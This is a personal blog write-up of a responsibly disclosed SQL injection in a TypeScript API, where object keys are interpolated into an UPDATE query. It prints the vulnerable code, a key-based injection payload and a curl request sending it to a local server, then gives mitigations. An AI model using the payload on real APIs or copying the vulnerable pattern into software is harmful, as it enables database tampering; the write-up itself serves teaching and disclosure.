---
title: Backend SQL Injection Research
date: 2025-08-25T00:00:00
tags: ["backend", "api", "sql", "injection", "security"]
type: post
showTableOfContents: true
---

{{< lead >}}
Finding an unexpected SQL injection accessible via an API. The issue was reported and resolved.
{{< /lead >}}

Often I read code from open source projects and projects created by clubs I am a member of. This example is derived from a PR I read where I found an SQL injection issue.

I let the respective team know that I was looking at the code and that there might be an issue. The author acknowledged that there might be SQL injection issues and I agreed. During the process of writing this report, the code was fixed. The issue was never deployed.

## Introduction

I was looking over some PRs and I came across this segment.

```ts
async updateProfile(id: string, updateData: UpdateProfileDto): Promise<any> {
  const client = await this.pool.connect();

  try {
    // Build dynamic update query
    const setClause = Object.keys(updateData)
      .map((key, index) => `${key} = $${index + 2}`)
      .join(', ');

    const values = [id, ...Object.values(updateData)];

    const updateQuery = `
      UPDATE profiles 
      SET ${setClause}
      WHERE id = $1
      RETURNING *
    `;

    const result = await client.query(updatequery, values);

    if (result.rows.length === 0) {
      throw new NotFoundException('Profile not found');
    }

    return result.rows[0];
  } finally {
    client.release();
  }
}
```

Breaking this code up, it's a function that takes a user ID and an object of type `UpdateProfileDto` as parameters. This function updates the profile stored in the database to reflect the object passed in.

```ts
async updateProfile(id: string, updateData: UpdateProfileDto): Promise<any> {
    // ...
}
```

Next, we connect to the database with:

```ts
const client = await this.pool.connect();
```

Inside a big `try / finally`, we have a few steps that update the database.


First, we build a query dynamically to update the database.

```ts
// Build dynamic update query
const setClause = Object.keys(updateData)
  .map((key, index) => `${key} = $${index + 2}`)
  .join(', ');
```

Second, we collect the values from the new data:

```ts
const values = [id, ...Object.values(updateData)];
```

Third, we insert out built query into a string with string substitution.

```ts
const updateQuery = `
  UPDATE profiles 
  SET ${setClause}
  WHERE id = $1
  RETURNING *
`;
```

Finally, we run the command that was generated.

```ts
const result = await client.query(updatequery, values);
```

There also is some validation afterwards, as well as a return statement:

```ts
if (result.rows.length === 0) {
  throw new NotFoundException('Profile not found');
}

return result.rows[0];
```

After a first pass, it didn't seem right. You can clearly see that there is some string manipulation that builds the query dynamically. I noticed `Object.keys` was the only thing accessed from the input data but it still felt off.

```ts
const setClause = Object.keys(updateData)
  .map((key, index) => `${key} = $${index + 2}`)
  .join(', ');

const values = [id, ...Object.values(updateData)];

const updateQuery = `
  UPDATE profiles 
  SET ${setClause}
  WHERE id = $1
  RETURNING *
`;
```

## Injecting via Value

I wanted to start by testing an SQL injection by changing the input values (And not the keys). I first created a mockClient to simulate running a query. This is just to rule out a possible issue that would allow a user to edit a value of their profile and have that cause an SQL injection. This is a very low complexity attack and has very serious implications.

```ts
class mockClient {
  // Log the query that would have been executed
  query = (text: string, values: [any]) => {
    console.log('Execute: ', text, '\nWith Values: ', values);

    // Return an object similar to the one expected
    return { rows: ['test'] };
  };

  // Needed to be defined
  release = () => {};
}

class mockPool {
  // Return the mockClient when `this.pool.connect()` is run
  connect = () => {
    return new mockClient();
  };
}
```

An injection with just the value looks like this:

```ts
// SQL Injection
const updatedProfileInject: UpdateProfileDto = {
  first_name: 'first_name = FOO WHERE id = $1 RETURNING * --'
};

sql.updateProfile('0', updatedProfileInject);
```

But this just parameterises the values correctly:

```
Execute:
        UPDATE profiles
        SET first_name = $2
        WHERE id = $1
        RETURNING *

With Values:  [ "0", "first_name = FOO WHERE id = $1 RETURNING * --" ]
```

Nothing got added to the SQL query directly. You cannot do an SQL injection by changing just the value. The simplest version of the attack didn't work. But there is more we can do.

Here is where it gets interesting. Before, we just edited the value of the object, but can we edit the key?

## Injecting via Key

In JavaScript and TypeScript, you can have objects with named keys:

```ts
const myObject = {
    myKey: "My Value",
}
```

And you can also have Strings be the keys!

```ts
const myObject = {
    "This is my key!": "And this is my value!"
}
```

Okay, we are back in business! If we could only edit the key, we'd maybe be able to inject some SQL. This is because we do actually use the key in the SQL command in the original code.

```ts
const setClause = Object.keys(updateData)
    .map((key, index) => `${key} = $${index + 2}`)
    .join(', ');
```

We use `Object.keys` and then we have `${key}` in the string.

An attack would involve adding SQL to the key of the object, instead of the value:

```ts
  // SQL Injection
  const updatedProfileInject: UpdateProfileDto = {
    'first_name = FOO WHERE id = $1 RETURNING * --': '',
  };

  sql.updateProfile('0', updatedProfileInject);
```

This outputs a query where we can clearly see the SQL got added directly to the command opposed to as a parameterised value.

```
Execute:
        UPDATE profiles
        SET first_name = FOO WHERE id = $1 RETURNING * -- = $2
        WHERE id = $1
        RETURNING *

With Values:  [ "0", "" ]
```

Bingo! That's an SQL injection. We now run into the problem that we'd need to be able to edit name of the key and usually that is not possible.

## Inject Object via the API

Because our endpoint directly calls our `updateProfile` function without type validation, we can actually inject the data as JSON object directly from the API.

```ts
@Put(':id')
async updateProfile(
  @Param('id') id: string,
  @Body() updateData: UpdateProfileDto
) {
  return this.profilesService.updateProfile(id, updateData);
}
```

To call this, you have to send the new data to this endpoint:

```
POST https://domain.tld/edit/profile/<UUIDv4>
```

Here is the data to send:

```json
{
    "firstName": "Jake",
    "lastInitial": "R",
    "phoneNumber": "500-123-4567",
    "first_name = 'FOO' WHERE id = $1 RETURNING * --": "email"
}
```

Look at the end, where we can create a key that includes our SQL injection payload.

If we can send this data to the API, it will create a query like this:

```
Execute:
        UPDATE profiles
        SET first_name = FOO WHERE id = $1 RETURNING * -- = $2
        WHERE id = $1
        RETURNING *

With Values:  [ "0", "foo" ]
```

I started the server locally and send a request to update the profile:

```sh
curl -X PUT "http://localhost:3001/profiles/bcd4f83e-96a0-43ab-abea-dfe461faee79" \
-H "Content-Type: application/json" -d '{
    "firstName": "Jake",
    "lastInitial": "R",
    "phoneNumber": "500-123-4567",
    "first_name = 'FOO' WHERE id = $1 RETURNING * --": "email"
  }'
```

Here is the query that got processed. Yup! SQL Injection!

```
UPDATE profiles
SET firstName = $2, lastInitial = $3, phoneNumber = $4,
first_name = FOO WHERE id = $1 RETURNING * -- = $5
WHERE id = $1
RETURNING *
```

We were able to inject `first_name = FOO WHERE id = $1 RETURNING * --` directly into the statement.

## How could we prevent this?

#### 1. Never build dynamic queries

If you need multiple different things to happen, statically write out each option and then parameterize the values. Don't dynamically change the query, especially if the user controls the input.

It's very unexpected that we could edit the key of the object and inject SQL that way. It's hard to know in every case what data can be controlled by an attacker.

Don't do this:

```ts
function makeQuery(editFirstName: string): string {
    return `UPDATE profiles SET id = ?, ${editFirstName} WHERE id = ?`;
}
```

Instead do this:

```ts
function makeQuery(editFirstName: boolean): string {
    
    // We only sometimes want to update the first name
    if (editFirstName) {
        return "UPDATE profiles SET id = ?, first_name = ? WHERE id = ?";
    } else {
        return "UPDATE profiles SET id = ? WHERE id = ?";
    }
}
```

The first one is much cleaner and extensible, but also VERY unsafe!

#### 2. Validate input data in the route

The first time the data type is created, you should validate that it has all of the correct keys and doesn't include any it should not have. You should also sanitize the input by check that the values don't contain anything malicious.

You can also go a step further and check the data at multiple steps.

If the input was limited to alpha-numeric characters, there isn't much that we could have done to inject SQL code.

We can validate the input in the route here:

```diff
@Put(':id')
async updateProfile(
  @Param('id') id: string,
  @Body() updateData: UpdateProfileDto
) {
+ // Validate `updateData`
+ if (isInvalidData(updateData)) {
+   // Return an error
+ }

  return this.profilesService.updateProfile(id, updateData);
}
```

## Conclusion

I told the developers that there might be issues with the recent PR. I told them before I was completely sure, so I just had to hint at where the issue might be. They acknowledged the possible SQL Injection and switched to a different ORM because they had been meaning to anyway. The issue was fixed during that process. This issue has now been completely resolved.

© 2025 Jake Roggenbuck
